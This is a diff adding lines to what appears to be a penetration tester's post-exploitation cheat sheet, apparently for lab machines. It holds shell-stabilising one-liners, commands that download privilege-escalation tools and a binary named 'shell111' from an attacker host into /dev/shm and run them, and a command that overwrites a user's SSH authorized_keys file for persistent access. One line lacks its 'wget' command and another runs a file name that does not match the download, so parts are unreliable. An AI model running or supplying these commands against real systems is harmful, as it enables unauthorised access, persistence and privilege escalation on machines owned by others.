@@ -11,7 +11,14 @@ stty raw -echo ; fg ; reset
 stty columns 200 rows 200
 stty columns 150 rows 150
 
+python -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm-256color && alias ll='ls -lsaht --color=auto'
+python3 -c 'import pty; pty.spawn("/bin/bash")' ; export TERM=xterm-256color ; alias ll='ls -lsaht --color=auto'
+
 wget http://192.168.45.178:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;wget http://192.168.45.178:8000/linpeas.sh -O /dev/shm/linpeas.sh;chmod +x /dev/shm/linpeas.sh;/dev/shm/pspy;
+wget http://192.168.45.178:80/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;wget http://192.168.45.178:80/linpeas.sh -O /dev/shm/linpeas.sh;chmod +x /dev/shm/linpeas.sh;wget http://192.168.45.178:80/shell111 -O /dev/shm/shell111;chmod +x /dev/shm/shell111;/dev/shm/pspy;
+wget http://192.168.45.178:80/shell111 -O /dev/shm/shell111;chmod +x /dev/shm/shell111;/dev/shm/shell80&
+wget http://192.168.45.178:8000/authorized_keys -O /home/kathleen/.ssh/authorized_keys
+http://192.168.45.178:3305/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;wget http://192.168.45.178:3305/linpeas.sh -O /dev/shm/linpeas.sh;chmod +x /dev/shm/linpeas.sh;/dev/shm/pspy;
 wget http://10.10.14.8:8000/pspy64 -O /dev/shm/pspy;chmod +x /dev/shm/pspy;wget http://10.10.14.8:8000/linpeas.sh -O /dev/shm/linpeas.sh;chmod +x /dev/shm/linpeas.sh;/dev/shm/pspy;
 /dev/shm/linpeas.sh
 
